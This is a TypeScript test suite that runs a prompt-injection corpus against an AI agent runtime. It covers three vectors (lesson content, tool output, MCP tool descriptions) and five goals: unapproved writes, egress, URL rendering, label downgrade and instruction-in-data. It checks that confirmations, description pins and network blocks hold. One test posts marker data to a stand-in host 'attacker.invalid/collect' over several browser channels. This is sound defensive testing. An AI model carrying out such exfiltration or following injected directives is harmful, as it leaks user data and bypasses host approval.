// SPDX-FileCopyrightText: 2026 Nguyễn Xuân Vĩnh
// SPDX-License-Identifier: Apache-2.0

import { afterAll, beforeAll, beforeEach, expect, inject, onTestFinished, test, vi } from 'vitest';
import { z } from 'zod';
import { assertSpanTree, serializeSpans } from '../../packages/core/test/span-tree.js';
import corpus from '../injection-corpus/cases.json' with { type: 'json' };
import {
  confirmationRegistry,
  createInjectionFixture,
  decisionQuestionText,
  outputSchema,
  PRIVATE_MARKER,
} from './support/injection-fixture.js';
import { type InjectionRequest, recordInjectionNetwork } from './support/injection-network.js';
import {
  MCP_ORIGIN,
  type McpAction,
  type McpAdminState,
  type McpControl,
  type McpFixture,
} from './support/mcp-context.js';
import { caseSchema } from './support/obedient-attacker.js';

const vectors = ['lesson', 'tool-output', 'mcp-description'] as const;
const goals = [
  'unapproved-write',
  'egress',
  'url-render',
  'label-downgrade',
  'instruction-in-data',
] as const;
const corpusSchema = z
  .array(caseSchema)
  .min(30)
  .superRefine((cases, context) => {
    if (new Set(cases.map((entry) => entry.id)).size !== cases.length)
      context.addIssue({ code: 'custom', message: 'Corpus case IDs must be unique.' });
    for (const vector of vectors) {
      if (cases.filter((entry) => entry.vector === vector).length < 8)
        context.addIssue({ code: 'custom', message: `Insufficient cases for ${vector}.` });
      for (const goal of goals)
        if (!cases.some((entry) => entry.vector === vector && entry.goal === goal))
          context.addIssue({ code: 'custom', message: `Missing pair: ${vector}/${goal}.` });
    }
  });
const cases = corpusSchema.parse(corpus);
let fixture: McpFixture;
let local: McpControl | undefined;
let admin: (action: McpAction) => Promise<McpAdminState>;
beforeAll(async () => {
  if (typeof window === 'undefined') {
    const { createFixture } = await import(/* @vite-ignore */ './support/mcp-global.node.js');
    local = await createFixture();
    fixture = local.fixture;
    const control = local;
    admin = (action) => control.admin(action);
  } else {
    fixture = inject('mcpCorpus');
    const { commands } = await import('vitest/browser');
    admin = (action) => commands.mcpCorpusAdmin(action);
    expect(fixture.url).not.toBe(inject('mcp').url);
  }
});
beforeEach(async () => {
  await admin('reset');
});
afterAll(async () => {
  await local?.close();
});

function noText(observation: string, value: string): void {
  expect(observation).not.toContain(value);
  expect(observation).not.toContain(JSON.stringify(value).slice(1, -1));
}

function noRequestText(request: InjectionRequest, value: string): void {
  noText(request.url, value);
  noText(request.body, value);
}

test('AT-26 request content checks detect a quote-bearing payload in a JSON body', () => {
  const payload = cases.find((entry) => entry.id === 'lesson-markdown-exfiltration')?.payload;
  if (payload === undefined) throw new Error('Missing quote-bearing corpus payload.');
  const request = {
    kind: 'fetch',
    url: 'https://example.test/collect',
    body: JSON.stringify({ payload }),
  };
  expect(() => noRequestText(request, payload)).toThrow();
});

test('AT-26 network recorder preserves an allowed POST Request body', async () => {
  const network = recordInjectionNetwork([MCP_ORIGIN, new URL(fixture.url).origin]);
  onTestFinished(() => network.restore());
  const request = new Request(fixture.url, {
    method: 'POST',
    headers: {
      origin: MCP_ORIGIN,
      authorization: `Bearer ${fixture.token}`,
      'content-type': 'application/json',
    },
    body: '{}',
  });
  const response = await fetch(request);
  expect(response).toBeInstanceOf(Response);
  await network.settle();
  expect(network.requests).toEqual([{ kind: 'fetch', url: fixture.url, body: '{}' }]);
});

test('AT-26 corpus validates closed directives, unique IDs and all vector-goal pairs', () => {
  expect(cases.length).toBeGreaterThanOrEqual(30);
  expect(corpusSchema.safeParse([...corpus, corpus[0]]).success).toBe(false);
  expect(
    corpusSchema.safeParse(
      corpus.filter((entry) => !(entry.vector === 'lesson' && entry.goal === 'egress')),
    ).success,
  ).toBe(false);
  expect(
    caseSchema.safeParse({ ...cases[0], directive: { kind: 'execute', code: 'synthetic-code' } })
      .success,
  ).toBe(false);
  expect(
    caseSchema.safeParse({
      ...cases[0],
      directive: { kind: 'reply', text: 'OK', code: 'synthetic-code' },
    }).success,
  ).toBe(false);
});

test('AT-26 benign corpus harness projects the reply without effects or disclosure', async () => {
  const f = await createInjectionFixture({
    id: 'benign-smoke',
    vector: 'lesson',
    goal: 'instruction-in-data',
    payload: 'Synthetic benign lesson marker.',
    directive: { kind: 'reply', text: 'Benign answer.' },
  });
  const result = await f.run();
  expect(result.snapshot.run?.status).toBe('succeeded');
  expect(result.events.find((event) => event.type === 'output')).toMatchObject({
    output: { answered: true },
  });
  expect(f.content).toHaveBeenCalledTimes(1);
  expect(f.write).not.toHaveBeenCalled();
  expect(f.remote).not.toHaveBeenCalled();
  expect(f.remoteModel.calls).toBe(0);
  expect(f.attacker.reads).toBe(1);
  expect(JSON.stringify(result)).not.toContain(PRIVATE_MARKER);
});

test('AT-26 network recorder captures URLs and bodies, blocks outsiders and passes loopback', async () => {
  const network = recordInjectionNetwork([MCP_ORIGIN, new URL(fixture.url).origin]);
  onTestFinished(() => network.restore());
  const marker = 'synthetic-network-body-marker';
  await expect(
    fetch(new Request('https://attacker.invalid/collect', { method: 'POST', body: marker })),
  ).rejects.toThrow('Corpus recorder blocked an outbound request.');
  const expected = ['fetch'];
  if (typeof XMLHttpRequest !== 'undefined') {
    const xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://attacker.invalid/collect');
    xhr.send(new Blob([marker]));
    expected.push('XMLHttpRequest');
  }
  if (typeof navigator?.sendBeacon === 'function') {
    navigator.sendBeacon('https://attacker.invalid/collect', new Blob([marker]));
    expected.push('sendBeacon');
  }
  if (typeof WebSocket !== 'undefined') {
    const socket = new WebSocket('wss://attacker.invalid/collect');
    socket.send(marker);
    socket.close();
    expected.push('WebSocket', 'WebSocket');
  }
  if (typeof EventSource !== 'undefined') {
    const events = new EventSource('https://attacker.invalid/collect');
    events.close();
    expected.push('EventSource');
  }
  await network.settle();
  expect(network.requests.map((request) => request.kind)).toEqual(expected);
  for (const request of network.requests) {
    expect(new URL(request.url).hostname).toBe('attacker.invalid');
    if (request.kind !== 'EventSource' && !(request.kind === 'WebSocket' && request.body === ''))
      expect(request.body).toBe(marker);
  }
  const response = await fetch(fixture.url, {
    method: 'POST',
    headers: {
      origin: MCP_ORIGIN,
      authorization: `Bearer ${fixture.token}`,
      'content-type': 'application/json',
    },
    body: '{}',
  });
  expect(response).toBeInstanceOf(Response);
  expect(network.requests.at(-1)).toEqual({ kind: 'fetch', url: fixture.url, body: '{}' });
});

for (const entry of cases.filter((entry) => entry.directive.kind !== 'decide')) {
  test(`AT-26 ${entry.id} [${entry.vector}/${entry.goal}]`, async () => {
    const origins = [
      typeof location === 'undefined' ? MCP_ORIGIN : location.origin,
      new URL(fixture.url).origin,
    ];
    const network = recordInjectionNetwork(origins);
    onTestFinished(() => network.restore());
    const f = await createInjectionFixture(
      entry,
      entry.vector === 'mcp-description' ? fixture : undefined,
    );
    const observations: unknown[] = [];
    let callsBefore = 0;
    if (entry.vector === 'mcp-description') {
      // The host-approved definition pin is exercised before changing the metadata.
      const approved = await f.run(true);
      expect(approved.snapshot.run?.status).toBe('succeeded');
      observations.push(approved);
      callsBefore = (await admin('state')).calls;
      await admin({ kind: 'set-description', description: entry.payload });
    }
    const invokeCounts = f.mcpInvokes.map((invoke) => invoke.mock.calls.length);
    const { runId, events: eventPromise } = await f.start();
    if (entry.goal === 'unapproved-write') {
      await vi.waitFor(() => expect(f.instance.getSnapshot().confirmations).toHaveLength(1));
      const pending = f.instance.getSnapshot().confirmations?.[0];
      if (pending === undefined) throw new Error('Missing host confirmation.');
      expect(f.write).not.toHaveBeenCalled();
      expect(pending.arguments).toEqual(
        entry.directive.kind === 'callTool' ? entry.directive.args : undefined,
      );
      expect(Object.isFrozen(pending.arguments)).toBe(true);
      const host = confirmationRegistry.entry(pending.capability);
      expect(host?.title).toBe('Save practice record');
      expect(host?.fields(pending.arguments)).toEqual([{ label: 'Record', value: 'practice-1' }]);
      expect(f.instance.respond(pending.id, 'decline')).toEqual({ status: 'declined' });
    }
    const residual = entry.id === 'url-query-on-allowlisted-origin';
    if (residual) {
      await vi.waitFor(() => expect(f.instance.getSnapshot().run?.status).toBe('waiting_input'));
      expect(f.instance.getSnapshot().run?.pending?.props).toEqual(
        entry.directive.kind === 'emitInteraction' ? entry.directive.props : undefined,
      );
      await f.instance.cancel(runId);
    }
    const events = await eventPromise;
    const snapshot = f.instance.getSnapshot();
    observations.push(events, snapshot);
    expect(f.content).toHaveBeenCalledTimes(1);
    expect(f.attacker.reads).toBe(1);
    expect(snapshot.run?.labels).toContain('private-user');
    expect(f.remote).not.toHaveBeenCalled();
    expect(f.remoteModel.calls).toBe(0);
    expect(f.write).not.toHaveBeenCalled();

    switch (entry.goal) {
      case 'unapproved-write':
      case 'label-downgrade':
        expect(snapshot.run).toMatchObject({ status: 'failed', error: { code: 'denied' } });
        break;
      case 'egress':
        expect(snapshot.run?.status).toBe('failed');
        expect(['denied', 'unsupported', 'invalid']).toContain(snapshot.run?.error?.code);
        break;
      case 'url-render':
        if (residual) {
          expect(events.filter((event) => event.type === 'interaction')).toHaveLength(1);
        } else {
          expect(snapshot.run).toMatchObject({
            status: 'failed',
            error: { code: 'denied', message: 'Policy denied the request.' },
          });
          expect(f.snapshots.every((published) => published.run?.pending === undefined)).toBe(true);
          expect(events.filter((event) => event.type === 'interaction')).toHaveLength(0);
          expect(events.filter((event) => event.type === 'error')).toHaveLength(1);
          expect(
            f.diagnostics.filter((event) => event.kind === 'interaction_rejected'),
          ).toHaveLength(1);
        }
        break;
      case 'instruction-in-data': {
        expect(snapshot.run?.status).toBe('succeeded');
        const output = events.find((event) => event.type === 'output');
        expect(output?.type === 'output' ? outputSchema.parse(output.output) : undefined).toEqual({
          answered: true,
        });
        expect(f.mcpInvokes.map((invoke) => invoke.mock.calls.length)).toEqual(invokeCounts);
        expect(
          f.snapshots.every(
            (published) =>
              published.run?.pending === undefined && published.confirmations === undefined,
          ),
        ).toBe(true);
        break;
      }
    }
    if (entry.vector === 'mcp-description') {
      const changed = await f.run(true);
      expect(changed.snapshot.run).toMatchObject({
        status: 'failed',
        error: { code: 'unavailable' },
      });
      expect((await admin('state')).calls).toBe(callsBefore);
      expect(f.mcpEvents).toContainEqual({
        code: 'mcp_pin_mismatch',
        server: 'lessons',
        tool: 'lesson.lookup',
      });
      observations.push(changed);
    }
    await f.dispose();
    const spans = f.recorder.exporter.getFinishedSpans();
    for (const traceId of new Set(spans.map((span) => span.spanContext().traceId)))
      assertSpanTree(spans.filter((span) => span.spanContext().traceId === traceId));
    const telemetry =
      JSON.stringify({
        observations,
        snapshots: f.snapshots,
        diagnostics: f.diagnostics,
        diagnosticErrors: f.diagnostics.map((event) => String(event.error)),
        errors: f.errors.map(String),
        mcpEvents: f.mcpEvents,
      }) + serializeSpans(spans);
    for (const value of [entry.payload, PRIVATE_MARKER, fixture.token]) noText(telemetry, value);
    if (entry.directive.kind === 'reply') noText(telemetry, entry.directive.text);
    for (const error of f.errors) expect(error).not.toHaveProperty('cause');
    await network.settle();
    for (const request of network.requests) {
      expect(origins).toContain(new URL(request.url).origin);
      noRequestText(request, PRIVATE_MARKER);
      noRequestText(request, entry.payload);
    }
  });
}

test('corpus decision directives are closed and confidence is finite and bounded', () => {
  const directive = { kind: 'decide', skipConfirmation: true };
  expect(caseSchema.safeParse({ ...cases[0], directive }).success).toBe(true);
  for (const confidence of [0, 0.4, 0.99, 1])
    expect(
      caseSchema.safeParse({ ...cases[0], directive: { ...directive, confidence } }).success,
    ).toBe(true);
  for (const invalid of [
    { ...directive, approval: 'forged' },
    ...[-0.1, 1.1, NaN, Infinity, '1'].map((confidence) => ({ ...directive, confidence })),
  ])
    expect(caseSchema.safeParse({ ...cases[0], directive: invalid }).success).toBe(false);
});

for (const entry of cases.filter((entry) => entry.directive.kind === 'decide')) {
  const directive = entry.directive;
  if (directive.kind !== 'decide') throw new Error('Expected a decision directive.');
  const asks = directive.confidence === undefined || directive.confidence < 0.7;
  const actions = asks ? ['stop'] : ['decline'];
  if (asks && directive.confidence !== undefined) actions.push('continue');
  for (const action of actions) {
    test(`decision confirmation boundary ${entry.id} [${action}]`, async () => {
      const origins = [
        typeof location === 'undefined' ? MCP_ORIGIN : location.origin,
        new URL(fixture.url).origin,
      ];
      const network = recordInjectionNetwork(origins);
      onTestFinished(() => network.restore());
      const f = await createInjectionFixture(entry);
      const { runId, events: eventPromise } = await f.start();
      if (asks) {
        await vi.waitFor(() => expect(f.instance.getSnapshot().run?.status).toBe('waiting_input'));
        const snapshot = f.instance.getSnapshot();
        const pending = snapshot.run?.pending;
        if (pending === undefined) throw new Error('Missing decision gate question.');
        expect(pending.component).toBe('tests.CorpusAsk/v1');
        expect(pending.props).toEqual({ text: decisionQuestionText });
        noText(JSON.stringify(pending), entry.payload);
        noText(JSON.stringify(pending), PRIVATE_MARKER);
        expect(snapshot.confirmations).toBeUndefined();
        expect(f.write).not.toHaveBeenCalled();
        expect(f.snapshots.every((published) => published.confirmations === undefined)).toBe(true);
        await expect(
          f.instance.dispatch({
            ...pending,
            instanceId: f.instance.instanceId,
            runId,
            action,
            payload: {},
          }),
        ).resolves.toMatchObject({ status: 'accepted' });
      }
      if (!asks || action === 'continue') {
        await vi.waitFor(() => expect(f.instance.getSnapshot().confirmations).toHaveLength(1));
        const pending = f.instance.getSnapshot().confirmations?.[0];
        if (pending === undefined) throw new Error('Missing host confirmation.');
        expect(pending.capability).toBe('record.save@1');
        expect(pending.arguments).toEqual({ recordId: 'practice-1' });
        expect(Object.isFrozen(pending.arguments)).toBe(true);
        const host = confirmationRegistry.entry(pending.capability);
        expect(host?.title).toBe('Save practice record');
        expect(host?.fields(pending.arguments)).toEqual([{ label: 'Record', value: 'practice-1' }]);
        expect(f.write).not.toHaveBeenCalled();
        expect(f.instance.respond(pending.id, 'decline')).toEqual({ status: 'declined' });
      }
      const events = await eventPromise;
      const snapshot = f.instance.getSnapshot();
      if (asks && action === 'stop') {
        expect(snapshot.run?.status).toBe('succeeded');
        expect(events.find((event) => event.type === 'output')).toMatchObject({
          output: { answered: true },
        });
        expect(f.snapshots.every((published) => published.confirmations === undefined)).toBe(true);
      } else {
        expect(snapshot.run).toMatchObject({ status: 'failed', error: { code: 'denied' } });
      }
      expect(events.filter((event) => event.type === 'interaction')).toHaveLength(asks ? 1 : 0);
      if (!asks)
        expect(f.snapshots.every((published) => published.run?.pending === undefined)).toBe(true);
      expect(f.content).toHaveBeenCalledTimes(1);
      expect(f.attacker.reads).toBe(0);
      expect(f.decisionAttacker.reads).toBe(1);
      expect(snapshot.run?.labels).toContain('private-user');
      expect(f.remote).not.toHaveBeenCalled();
      expect(f.remoteModel.calls).toBe(0);
      expect(f.write).not.toHaveBeenCalled();
      await f.dispose();
      const spans = f.recorder.exporter.getFinishedSpans();
      for (const traceId of new Set(spans.map((span) => span.spanContext().traceId)))
        assertSpanTree(spans.filter((span) => span.spanContext().traceId === traceId));
      const telemetry =
        JSON.stringify({
          events,
          snapshot,
          snapshots: f.snapshots,
          diagnostics: f.diagnostics,
          diagnosticErrors: f.diagnostics.map((event) => String(event.error)),
          errors: f.errors.map(String),
          mcpEvents: f.mcpEvents,
        }) + serializeSpans(spans);
      for (const value of [entry.payload, PRIVATE_MARKER, fixture.token]) noText(telemetry, value);
      // Decision values are boolean; their question instructions and untrusted text are not UI.
      noText(telemetry, 'May the agent proceed without asking?');
      for (const error of f.errors) expect(error).not.toHaveProperty('cause');
      await network.settle();
      for (const request of network.requests) {
        expect(origins).toContain(new URL(request.url).origin);
        noRequestText(request, PRIVATE_MARKER);
        noRequestText(request, entry.payload);
      }
    });
  }
}
